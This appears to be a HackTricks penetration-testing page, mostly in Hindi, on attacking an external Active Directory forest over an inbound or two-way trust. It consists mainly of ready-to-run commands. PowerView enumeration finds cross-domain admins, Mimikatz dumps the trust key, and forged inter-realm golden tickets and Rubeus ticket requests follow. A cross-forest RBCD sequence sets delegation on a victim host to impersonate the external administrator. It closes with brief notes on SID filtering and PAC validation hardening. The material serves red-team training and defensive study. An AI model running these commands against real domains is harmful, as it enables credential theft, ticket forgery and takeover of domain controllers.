# External Forest Domain - OneWay (Inbound) या दो-तरफा

{{#include ../../banners/hacktricks-training.md}}

इस परिदृश्य में एक बाहरी डोमेन आप पर भरोसा कर रहा है (या दोनों एक-दूसरे पर भरोसा कर रहे हैं), इसलिए आप उस पर किसी प्रकार की पहुँच प्राप्त कर सकते हैं।

## Enumeration

सबसे पहले, आपको **enumerate** करना होगा **trust**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` आपको जल्दी बताने देते हैं कि cross-forest abuse paths (RBCD, SIDHistory) अतिरिक्त पूर्व-आवश्यकताओं के बिना काम करने की संभावना रखते हैं या नहीं।

In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.

## प्रारम्भिक पहुँच

यदि आप दूसरे डोमेन में अपने उपयोगकर्ता की कोई **special** access **नहीं पा सके**, तो आप अभी भी AD Methodology पर वापस जा सकते हैं और **privesc from an unprivileged user** आजमा सकते हैं (उदाहरण के लिए kerberoasting जैसी चीज़ें):

आप `-Domain` param का उपयोग करके **Powerview functions** से **other domain** को **enumerate** कर सकते हैं, जैसे:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Logging in

बाहरी डोमेन तक पहुँच रखने वाले उपयोगकर्ताओं के credentials का उपयोग करके सामान्य तरीके से आप पहुँच पाएंगे:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

आप एक forest trust के पार [**SID History**](sid-history-injection.md) का भी दुरुपयोग कर सकते हैं।

यदि किसी user को **from one forest to another** migrate किया गया है और **SID Filtering is not enabled**, तो आप **add a SID from the other forest** कर सकते हैं, और यह **SID** **across the trust** authenticate करने पर **user's token** में **added** हो जाएगा।

> [!WARNING]
> याद दिलाने के लिए, आप signing key को निम्न कमांड से प्राप्त कर सकते हैं
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

आप current domain के user का **TGT impersonating** को **trusted** key से **sign with** कर सकते हैं।
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### उपयोगकर्ता की पूरी तरह नकल करने का तरीका
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD — जब आप trusting forest में एक machine account को नियंत्रित करते हैं (no SID filtering / selective auth)

यदि आपका foreign principal (FSP) आपको ऐसे समूह में रखता है जो trusting forest में computer objects लिख सकता है (उदा., `Account Operators`, custom provisioning group), तो आप उस फॉरेस्ट के किसी target host पर **Resource-Based Constrained Delegation** कॉन्फ़िगर कर सकते हैं और वहाँ किसी भी उपयोगकर्ता के रूप में कार्य कर सकते हैं:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
यह केवल तभी काम करता है जब **SelectiveAuthentication is disabled** और **SID filtering** आपके controlling SID को strip नहीं करता है। यह SIDHistory forging से बचने वाला एक तेज़ lateral path है और अक्सर trust reviews में नजरअंदाज़ हो जाता है।

### PAC validation कठोरिकरण

PAC signature validation अपडेट्स **CVE-2024-26248**/**CVE-2024-29056** inter-forest टिकट्स पर signing enforcement जोड़ते हैं। **Compatibility mode** में, forged inter-realm PAC/SIDHistory/S4U paths अनpatched DCs पर अभी भी काम कर सकते हैं। **Enforcement mode** में, unsigned या tampered PAC डेटा जो forest trust पार करता है, अस्वीकार कर दिया जाता है जब तक कि आपके पास target forest trust key न हो। Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) इसके प्रभाव को उस समय तक कमजोर कर सकते हैं जब तक वे उपलब्ध हों।

## References

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
